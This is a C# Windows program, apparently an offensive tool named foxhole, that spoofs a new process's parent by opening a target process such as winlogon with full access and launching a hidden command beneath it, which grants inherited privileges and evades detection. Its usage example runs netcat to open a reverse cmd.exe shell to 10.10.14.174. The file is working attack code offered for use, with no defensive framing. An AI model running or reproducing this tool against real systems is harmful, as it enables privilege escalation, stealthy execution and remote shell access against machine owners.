using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref int lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        PROCESS_ALL_ACCESS = 0x001F0FFF
    }

    [Flags]
    public enum ProcessCreationFlags : uint
    {
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        CREATE_NO_WINDOW = 0x08000000
    }

    public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    static void Main(string[] args)
    {
        if (args.Length != 4 || args[0] != "-p" || args[2] != "-c")
        {
            Console.WriteLine("Usage: foxhole.exe -p <process name> -c \"<command to run>\"");
            Console.WriteLine("Example: .\\sepoc.exe -p winlogon -c \"c:\\temp\\nc.exe 10.10.14.174 9998 - e cmd.exe");
            return;
        }

        string processName = args[1];
        string commandLine = args[3];
        int targetPid = 0;

        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            targetPid = processes[0].Id;
        }
        else
        {
            Console.WriteLine($"Process '{processName}' not found.");
            return;
        }

        IntPtr hParentProcess = OpenProcess(ProcessAccessFlags.PROCESS_ALL_ACCESS, false, targetPid);
        if (hParentProcess == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to open the parent process '{processName}' with PID {targetPid}. Error code: {Marshal.GetLastWin32Error()}");
            return;
        }

        STARTUPINFOEX siEx = new STARTUPINFOEX();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        siEx.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEX>();
        int lpSize = 0;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

        IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(lpValue, hParentProcess);

        UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

        bool success = CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, (uint)ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | (uint)ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pi);

        if (!success)
        {
            Console.WriteLine($"Failed to create process. Error code: {Marshal.GetLastWin32Error()}");
            return;
        }
        Console.WriteLine($"Process started successfully with PID {pi.dwProcessId}");

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        Marshal.FreeHGlobal(siEx.lpAttributeList);
        Marshal.FreeHGlobal(lpValue);
    }
}
